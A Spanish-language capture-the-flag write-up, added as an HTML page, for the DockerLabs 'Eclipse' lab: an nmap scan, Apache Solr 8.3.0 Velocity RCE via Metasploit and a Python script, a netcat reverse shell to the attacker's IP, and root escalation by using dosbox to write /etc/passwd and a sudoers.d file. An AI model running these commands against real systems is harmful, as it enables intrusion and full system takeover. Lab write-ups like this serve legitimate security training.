@@ -1,0 +1,119 @@
+<p><img src="assets/eclipse/portada.png" alt="portada" /></p>
+
+<p>En este reto de <a href="https://dockerlabs.es" title="DockerLabs">DockerLabs</a> aprendemos.</p>
+
+<ul>
+  <li>Scan de puertos</li>
+  <li>Explotacion Slor 8.3.0</li>
+</ul>
+
+<h2 id="herramientas-y-recursos">Herramientas y recursos</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>msfconsole</li>
+  <li><a href="https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template" title="Script">script</a></li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeracion">Reconocimiento y enumeracion</h2>
+
+<p>Lanzamos nmap con los parámetros de costumbre en un ctf.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> eclipse 172.17.0.2
+</code></pre></div></div>
+
+<p><a href="/reporte/eclipse.html">reporte</a></p>
+
+<p>Después de revisar el reporte de nmap nos encontramos con el puerto 80 el cual corre un servicio apache , también observamos que corre otro servicio en el puerto 8983 que resulta ser un servidor web escrito en java usado para realizar búsquedas verticales (es decir dentro un blog por ejemplo).</p>
+
+<p>En el 80 solo disponemos de una imagen la cual no nos proporciona nada así que investigamos bien a solr.</p>
+
+<p><img src="assets/eclipse/solr8.3.0.png" alt="solr" /></p>
+
+<p>Como vemos en la parte del dashboard ya nos dice la versión , con ese dato paso a buscar si es explotable.</p>
+
+<p>Estamos de suerte y encontramos varios métodos realmente es el mismo pero con distintas formas uno con metasploit y otro con un script de python.</p>
+
+<h2 id="intrusion">Intrusion</h2>
+
+<blockquote class="prompt-info">
+  <p>Realizo tanto método con msfconsole como con script</p>
+</blockquote>
+
+<blockquote class="prompt-danger">
+  <p>Ojo los que no acostumbramos a usar msf pues se me pasaba por alto el parámetro set target y no me funcionaba</p>
+</blockquote>
+
+<p>Con metasploit sigo los pasos después de leerlo bien y nos adaptamos a nuestro entorno.</p>
+
+<h3 id="metasploit">metasploit</h3>
+
+<p><img src="assets/eclipse/msfconsole.png" alt="msf" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/http/solr_velocity_rce
+<span class="nb">set </span>RHOST 172.17.0.2
+check
+<span class="nb">set </span>TARGET 1
+<span class="nb">set </span>LHOST 192.168.0.112
+</code></pre></div></div>
+
+<p>Si nos fijamos en la imagen de abajo y dependiendo del softaware a explotar también disponemos de opciones dependiendo de donde este instalado dicho software,  <strong>show options</strong>  y <strong>show targets</strong> hay que acostumbrase a invocarlos.</p>
+
+<p><img src="assets/eclipse/target.png" alt="target" /></p>
+
+<p>Hasta que me di cuenta del target paso un buen rato :-)…….</p>
+
+<p><img src="assets/eclipse/revmeta.png" alt="revmeta" /></p>
+
+<p>Hasta aquí con metasploit.</p>
+
+<h3 id="metodo-script">Metodo script</h3>
+
+<p>Con este método es incluso mas sencillo solo debemos indicar la ip de la victima , el puerto y el comando a ejecutar por defecto tira un <strong>whoami</strong></p>
+
+<p><img src="assets/eclipse/script.png" alt="script" /></p>
+
+<p>Vamos a través del script a mandarnos una shell con netcat.</p>
+
+<p>Para ello en la victima ejecutamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit_solr_8.3.0_velocity.py 172.17.0.2 8983 <span class="s2">"nc 192.168.0.112 9999 -c /bin/bash"</span>
+</code></pre></div></div>
+<p>y nos ponemos a la escucha.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 9999
+</code></pre></div></div>
+
+<p><img src="assets/eclipse/revmeta.png" alt="recibida" /></p>
+
+<p>Realizamos tratamiento de la tty</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+control 
+<span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+</code></pre></div></div>
+<h2 id="escalada">Escalada</h2>
+
+<p>Lo primero pruebo con sudo y nos pide pass, después tiro de find , con find obtenemos dosbox.</p>
+
+<p>Leyendo un poco entiendo que el binario nos permite escribir si no me equivoco aquí tendríamos varios archivos en los que poder escribir para hacernos root.</p>
+
+<p>Trate de escribir el fichero /etc/passwd el cual conseguía escribirlo pero al realizar su con el nuevo usuario que le ponía no me permitía el login error <strong>authentication failure</strong></p>
+
+<p>Con mi método hacia lo siguiente pero no conseguí que funcionara.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">LFILE</span><span class="o">=</span>/etc/passwd
+openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> <span class="s2">"loco"</span> <span class="s2">"qwerty"</span>
+/usr/bin/dosbox <span class="nt">-c</span> <span class="s1">'mount c /'</span> <span class="nt">-c</span> <span class="s2">"echo loco:</span><span class="nv">$1$lvWjKN2kvSJaYzi69Mk</span><span class="s2">/:0:0:root:/root:/bin/bash &gt;&gt;c:</span><span class="nv">$LFILE</span><span class="s2">"</span> <span class="nt">-c</span> <span class="nb">exit</span>
+</code></pre></div></div>
+
+<p>Como veis intentaba crear un usuario con privilegios de root y lo añadía al /etc/passwd.Aparentemente se añadía pero no permitía el login.</p>
+
+<p>Así que para terminar la maquina realice lo siguiente con sudoers.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">LFILE</span><span class="o">=</span>/etc/sudoers.d/ninhack
+dosbox <span class="nt">-c</span> <span class="s1">'mount c /'</span> <span class="nt">-c</span> <span class="s2">"echo ninhack ALL=(ALL) D: ALL &gt;c:</span><span class="nv">$LFILE</span><span class="s2">"</span> <span class="nt">-c</span> <span class="nb">exit</span>
+</code></pre></div></div>
+
+<p><img src="assets/eclipse/root.png" alt="root" /></p>
+
+<p>Muchas gracias por leer compartan y si averiguan como conseguirlo a través del passwd comenten ….un saludo.</p>
